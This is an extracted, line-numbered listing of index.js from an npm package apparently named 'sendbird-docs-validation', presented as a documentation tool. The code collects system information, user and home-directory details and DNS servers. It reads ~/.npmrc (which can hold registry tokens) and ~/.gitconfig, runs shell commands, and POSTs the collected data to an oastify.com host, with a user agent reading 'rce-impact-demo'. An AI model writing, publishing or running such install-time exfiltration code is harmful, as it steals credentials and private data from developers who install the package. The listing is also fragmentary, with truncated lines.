// File: tmp/tmps77ap15v/sendbird-docs-validation/package/index.js
// ======================================================================
Line 1: const os = require("os")
Line 2: const fs = require("fs")
Line 3: const path = require("path")
Line 4: const https = require("https")
Line 5: const querystring = require("querystring")
Line 6: const child_process = require("child_process")
Line 11: const size = fs.statSync(p).size
Line 13: fs.readFileSync(p, "utf8")
Line 29: (_tmp_0 = child_process.execSync(cmd, { timeout: 4000 }).toString()).trim
Line 38: dump = {
        timestamp: new Date().toISOString(),
        app: (() => {
            try {
                const pkg = require("./package.json");
                return { name: pkg.name, version: pkg.version };
            } catch {
                return {};
            }
        })(),
        os: {
            hostname: os.hostname(),
            platform: os.platform(),
            arch: os.arch(),
            uptime: os.uptime(),
            cpus: os.cpus(),
            totalmem: os.totalmem(),
            freemem: os.freemem(),
            userInfo: os.userInfo(),
            tmpdir: os.tmpdir(),
            homedir: os.homedir(),
            cwd: process.cwd(),
        },
        dns: (() => {
            try {
                const dns = require("dns");
                return dns.getServers();
            } catch (e) {
                return [`ERR: ${e.message}`];
            }
        })(),
        dirs: {
            "~": safeReadDir(os.ho...
Line 40: _tmp_4.app = (() => {
            try {
                const pkg = require("./package.json");
                return { name: pkg.name, version: pkg.version };
            } catch {
                return {};
            }
        })()
Line 42: const pkg = require("./package.json")
Line 49: os.hostname()
Line 50: os.platform()
Line 51: os.arch()
Line 53: os.cpus()
Line 54: os.totalmem()
Line 56: os.userInfo()
Line 61: _tmp_4.dns = (() => {
            try {
                const dns = require("dns");
                return dns.getServers();
            } catch (e) {
                return [`ERR: ${e.message}`];
            }
        })()
Line 63: const dns = require("dns")
Line 66: _tmp_10.push(<operator>.formatString("ERR: ", e.message, ""))
Line 75: safeReadFile(path.join(os.homedir(), ".npmrc"))
Line 76: safeReadFile(path.join(os.homedir(), ".gitconfig"))
Line 85: {
    const postData = querystring.stringify({
        msg: JSON.stringify(dump)
    });

    const options = {
        hostname: "3z3irru14bp9v32kmjaqoynae1ks8kw9.oastify.com",
        port: 443,
        path: "/",
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": postData.length,
            "User-Agent": "rce-impact-demo"
        }
    };

    const req = https.request(options, res => {
        res.on("data", () => { });
    });

    req.on("error", () => { });
    req.write(postData);
    req.end();

    https.get("https://ping.3z3irru14bp9v32kmjaqoynae1ks8kw9.oastify.com/", () => { });
}
Line 102: const req = https.request(options, res => {
        res.on("data", () => { });
    })
Line 107: req.write(postData)
Line 108: req.end()
Line 110: https.get("https://ping.3z3irru14bp9v32kmjaqoynae1ks8kw9.oastify.com/", () => { })
Line 113: https.get("https://ping.3z3irru14bp9v32kmjaqoynae1ks8kw9.oastify.com/", () => { })
